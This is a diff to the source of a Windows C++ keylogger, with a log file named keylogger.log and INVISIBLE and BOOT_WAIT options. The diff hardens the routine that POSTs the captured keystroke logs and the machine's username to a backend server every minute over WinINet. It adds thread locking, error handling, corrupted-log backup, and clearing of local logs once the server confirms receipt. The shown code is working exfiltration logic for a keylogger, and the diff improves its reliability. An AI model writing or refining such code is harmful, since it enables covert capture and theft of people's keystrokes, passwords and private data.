@@ -13,21 +13,21 @@
 #include <sstream>
 #include <fstream>
 #include "json.hpp"
-
-
+#include <mutex>
+#include <cstdio>
 
 using json = nlohmann::json;
 using namespace std;
 
 // Configurations
 #define FORMAT 0        // 0 = labels, 10 = decimal, 16 = hex
-#define INVISIBLE       // INVISIBLE or VISIBLE
+#define VISIBLE       // INVISIBLE or VISIBLE
 #define BOOT_WAIT       // BOOT_WAIT or NOWAIT
 #define MOUSE_IGNORE    // ignore mouse clicks
 
-const char* serverName = "localhost";
+const char* serverName = "127.0.0.1";
 const char* resource = "/";
-const int intervalMinutes = 20;  // Every 1 minute
+const int intervalMinutes = 1;  // Every 1 minute
 const string log_file_name = "keylogger.log";
 const int BACKEND_PORT = 8000;
 
@@ -179,68 +179,87 @@ string getUserName(){
     return ""; 
 }
 
-string getLogsAsJsonArray(const std::string& filename) {
-    ifstream logFile(filename);
-    string line;
+std::mutex log_mutex; // For thread safety
+
+// Utility: Safely open a file for reading
+bool safeOpenFile(const std::string& filename, std::ifstream& file) {
+    file.open(filename);
+    if (!file.is_open()) {
+        std::cerr << "[ERROR] Failed to open file: " << filename << std::endl;
+        return false;
+    }
+    return true;
+}
+
+// Utility: Backup a corrupted log file
+void backupCorruptedLog(const std::string& filename) {
+    std::string backupName = filename + ".bak";
+    std::remove(backupName.c_str());
+    std::rename(filename.c_str(), backupName.c_str());
+    std::cerr << "[WARN] Log file backed up as: " << backupName << std::endl;
+}
+
+// Robust JSON log loader
+json getLogsAsJsonArray(const std::string& filename) {
+    std::lock_guard<std::mutex> lock(log_mutex);
+    std::ifstream logFile;
+    if (!safeOpenFile(filename, logFile)) return json::array();
+    std::string line;
     json logs = json::array();
+    int lineNum = 0;
     while (getline(logFile, line)) {
+        ++lineNum;
         if (!line.empty()) {
             try {
                 logs.push_back(json::parse(line));
-            } catch (...) {
-                // skip invalid lines
+            } catch (const std::exception& e) {
+                std::cerr << "[ERROR] JSON parse error at line " << lineNum << ": " << e.what() << std::endl;
+                // Backup and clear corrupted log
+                backupCorruptedLog(filename);
+                break;
             }
         }
     }
-    return logs.dump();
+    return logs;
 }
 
-// Function to simulate backend call (here just printing to console)
+// Function to send logs to backend, only flushes on confirmed success
 void sendLogsToBackend() {
-    ifstream logFile(log_file_name);
+    std::lock_guard<std::mutex> lock(log_mutex);
+    std::ifstream logFile(log_file_name);
     if (!logFile.is_open()) {
-        std::cerr << "Failed to open log file.\n";
+        std::cerr << "[ERROR] Failed to open log file for upload.\n";
         return;
     }
-
-    // Extract the logs from file
-    string logs((istreambuf_iterator<char>(logFile)), istreambuf_iterator<char>());
+    // Extract logs
+    std::string logs((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
     logFile.close();
-
-    // No logs => No need to make backend request, just return!
     if (logs.empty()) {
-        std::cout << "Log file is empty. Skipping upload.\n";
+        std::cout << "[INFO] Log file is empty. Skipping upload.\n";
         return;
     }
-
-    string hostname = getUserName();
-
+    std::string hostname = getUserName();
     HINTERNET hSession = InternetOpenA("LogUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) {
-        std::cerr << "Failed to open Internet session.\n";
+        std::cerr << "[ERROR] Failed to open Internet session.\n";
         return;
     }
-
     HINTERNET hConnect = InternetConnectA(hSession, serverName, BACKEND_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
-        std::cerr << "Failed to connect to server.\n";
+        std::cerr << "[ERROR] Failed to connect to server.\n";
         InternetCloseHandle(hSession);
         return;
     }
-
     HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, NULL, 0, 0);
     if (!hRequest) {
-        std::cerr << "Failed to open HTTP request.\n";
+        std::cerr << "[ERROR] Failed to open HTTP request.\n";
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hSession);
         return;
     }
-
-    string logsJson = getLogsAsJsonArray(log_file_name);
-    string body = "{\"logs\":" + logsJson + ",\"hostname\":\"" + hostname + "\"}";
-    // string body = "{\"logs\":\"" + logs + "\",\"hostname\":\"" + hostname + "\"}";
-    string headers = "Content-Type: application/json\r\n";
-
+    std::string logsJson = getLogsAsJsonArray(log_file_name).dump();
+    std::string body = "{\"logs\":" + logsJson + ",\"hostname\":\"" + hostname + "\"}";
+    std::string headers = "Content-Type: application/json\r\n";
     BOOL bRequestSent = HttpSendRequestA(
         hRequest,
         headers.c_str(),
@@ -248,49 +267,42 @@ void sendLogsToBackend() {
         (LPVOID)body.c_str(),
         body.size()
     );
-    cout<<typeid(body).name()<<endl;
-    cout<<body<<endl;
-
     if (!bRequestSent) {
-        std::cerr << "Failed to send HTTP request.\n";
-        cout<<bRequestSent<<endl;
+        std::cerr << "[ERROR] Failed to send HTTP request.\n";
     } else {
         char responseBuffer[4096] = { 0 };
         DWORD bytesRead = 0;
-
         BOOL bRead = InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead);
         if (bRead && bytesRead > 0) {
             responseBuffer[bytesRead] = '\0';
-            string response(responseBuffer);
-
-            cout << "Server response: " << response << std::endl;
-
-            // Trim whitespaces (optional)
+            std::string response(responseBuffer);
             response.erase(0, response.find_first_not_of(" \t\n\r"));
             response.erase(response.find_last_not_of(" \t\n\r") + 1);
-
             if (response == "{\"success\":true}") {
                 std::ofstream clearFile(log_file_name, std::ios::out | std::ios::trunc);
                 clearFile.close();
-                std::cout << "Logs cleared after successful upload.\n";
+                std::cout << "[INFO] Logs cleared after successful upload.\n";
             } else {
-                std::cerr << "Upload failed. Server response not {\"success\":true}.\n";
+                std::cerr << "[ERROR] Upload failed. Server response not {\"success\":true}.\n";
             }
         } else {
-            std::cerr << "Failed to read server response.\n";
+            std::cerr << "[ERROR] Failed to read server response.\n";
         }
     }
-
     InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hSession);
 }
 
-// Background worker that runs every X minutes
+// Background worker that runs every X minutes, with error handling
 void scheduleBackendCalls(int intervalSeconds) {
     while (true) {
-        this_thread::sleep_for(chrono::seconds(intervalSeconds));
-        sendLogsToBackend();
+        try {
+            sendLogsToBackend();
+        } catch (const std::exception& e) {
+            std::cerr << "[FATAL] Exception in sendLogsToBackend: " << e.what() << std::endl;
+        }
+        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
     }
 }
 
